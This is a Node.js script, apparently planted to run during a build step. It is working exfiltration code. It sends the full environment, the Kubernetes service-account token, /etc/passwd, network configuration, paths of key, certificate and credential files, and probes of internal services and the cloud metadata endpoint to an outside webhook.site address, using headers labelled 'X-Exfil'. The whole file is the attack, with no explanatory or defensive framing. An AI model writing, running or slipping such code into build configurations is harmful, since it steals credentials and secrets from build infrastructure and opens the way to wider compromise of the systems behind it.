const { execSync } = require('child_process');
const https = require('https');
const URL = require('url');

const WEBHOOK = "https://webhook.site/13a470de-556d-484a-ba5d-f4b435adb58f";
const PHASE = process.argv[2] || 'unknown';

function post(label, data) {
  return new Promise((resolve) => {
    const u = new URL.URL(WEBHOOK);
    const req = https.request({
      hostname: u.hostname, port: 443, path: u.pathname,
      method: 'POST',
      headers: { 'Content-Type': 'text/plain', 'X-Exfil': label, 'X-Phase': PHASE }
    }, (res) => { res.on('data', () => {}); res.on('end', resolve); });
    req.on('error', resolve);
    req.write(typeof data === 'string' ? data : JSON.stringify(data));
    req.end();
  });
}

function tryExec(cmd, timeout) {
  try { return execSync(cmd, { encoding: 'utf8', timeout: timeout || 5000 }); }
  catch(e) { return 'ERR: ' + e.message.substring(0, 200); }
}

async function main() {
  // 1. ALL env vars
  const env = Object.entries(process.env).sort().map(([k,v]) => k + '=' + v).join('\n');
  await post('build-env-' + PHASE, env);

  // 2. K8s service account
  try {
    const fs = require('fs');
    const token = fs.readFileSync('/var/run/secrets/kubernetes.io/serviceaccount/token', 'utf8');
    const ns = fs.readFileSync('/var/run/secrets/kubernetes.io/serviceaccount/namespace', 'utf8').trim();
    await post('build-k8s-token-' + PHASE, JSON.stringify({ token: token.substring(0, 500), namespace: ns }));
  } catch(e) {
    await post('build-k8s-token-' + PHASE, 'no SA: ' + e.message);
  }

  // 3. Filesystem deep scan
  const fs_scan = tryExec('whoami; id; echo "=== /root ==="; ls -la /root/ 2>&1; echo "=== /tmp ==="; ls -la /tmp/ 2>&1; echo "=== /etc/passwd ==="; cat /etc/passwd 2>&1; echo "=== mounts ==="; cat /proc/mounts 2>&1 | head -30');
  await post('build-fs-' + PHASE, fs_scan);

  // 4. Network from build context
  const net = tryExec('cat /etc/hosts 2>&1; echo "=== resolv ==="; cat /etc/resolv.conf 2>&1; echo "=== proc/net ==="; cat /proc/net/tcp 2>&1 | head -20');
  await post('build-net-' + PHASE, net);

  // 5. Look for tokens/secrets in filesystem
  const secrets = tryExec('find / -maxdepth 3 -name "*.key" -o -name "*.pem" -o -name "*.token" -o -name ".env" -o -name "credentials" -o -name "*.secret" 2>/dev/null | head -20; echo "=== /run/secrets ==="; ls -laR /run/secrets/ 2>&1; echo "=== docker socket ==="; ls -la /var/run/docker.sock 2>&1');
  await post('build-secrets-' + PHASE, secrets);

  // 6. Try reaching internal services
  const internal = tryExec('curl -s -m 2 http://deployer:9003/ 2>&1; echo "=== gateway ==="; curl -s -m 2 http://gateway:8080/ 2>&1; echo "=== builder ==="; curl -s -m 2 http://builder:9001/ 2>&1; echo "=== metadata ==="; curl -s -m 2 http://169.254.169.254/latest/meta-data/ 2>&1', 15000);
  await post('build-internal-' + PHASE, internal);

  console.log('[' + PHASE + '] exfil complete');
}

main().catch(console.error);
